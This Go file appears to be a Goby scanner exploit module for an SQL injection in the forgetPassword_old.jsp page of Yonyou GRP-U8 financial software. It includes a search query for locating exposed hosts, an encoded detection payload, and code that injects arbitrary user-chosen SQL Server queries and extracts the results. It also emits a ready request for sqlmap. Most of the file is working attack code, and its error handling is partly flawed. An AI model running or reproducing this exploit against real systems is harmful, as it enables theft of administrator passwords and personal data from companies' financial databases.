package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou GRP-U8 forgetPassword_old SQL Injection Vulnerability",
    "Description": "<p>Yonyou GRP-U8 is a powerful financial management software that can help enterprises quickly and accurately conduct financial accounting and fund management.</p>",
    "Product": "Yonyou GRP-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-12-27",
    "PostTime": "2024-07-22",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "GobyQuery": "(body=\"GRP-U8\" && body=\"./scripts/cookie.js\") || title=\"GRP-U8\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a> </p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/u8qx/forgetPassword_old.jsp?action=save",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "Connection": "close",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "idCard=1%27%20AND%207155%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28112%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--%20BEmg&inputDW=1&userName=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "12432",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "用友 GRP-U8 forgetPassword_old SQL 注入漏洞",
            "Product": "用友 GRP-U8 forgetPassword_old",
            "Description": "<p>用友 GRP-U8 是一款功能强大的财务管理软件,可以帮助企业快速、准确地进行财务核算和资金管理。<br></p>",
            "Recommendation": "<p>1、⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a>&nbsp;</p><p>&nbsp;2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>&nbsp;3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou GRP-U8 forgetPassword_old SQL Injection Vulnerability",
            "Product": "Yonyou GRP-U8",
            "Description": "<p>Yonyou GRP-U8 is a powerful financial management software that can help enterprises quickly and accurately conduct financial accounting and fund management.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a>&nbsp;</p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	setSqlPayloadpIdiQoc9 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		rawPayload := fmt.Sprintf("1' and 1=(convert(int,(%s)))-- ", sql)
		urlEncodePayload := url.QueryEscape(rawPayload)
		postData := fmt.Sprintf("idCard=%s&inputDW=1&userName=1", urlEncodePayload)
		urlget := "/u8qx/forgetPassword_old.jsp?action=save"

		resp, err = setPostRequest(hostInfo, urlget, postData, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil{
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/u8qx/forgetPassword_old.jsp?action=save"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "SQL Server"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "@@version"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadpIdiQoc9
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /u8qx/forgetPassword_old.jsp?action=save HTTP/1.1\nHost:"+ expResult.HostInfo.FixedHostInfo +"\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\nContent-Length: 361\n\nidCard=1%27+and+1%3D%28convert%28int%2C%28%40%40version%29%29%29--+&inputDW=1&userName=1"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `'((.|\n)*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindAllString(RegularContent, 2)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadpIdiQoc9
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
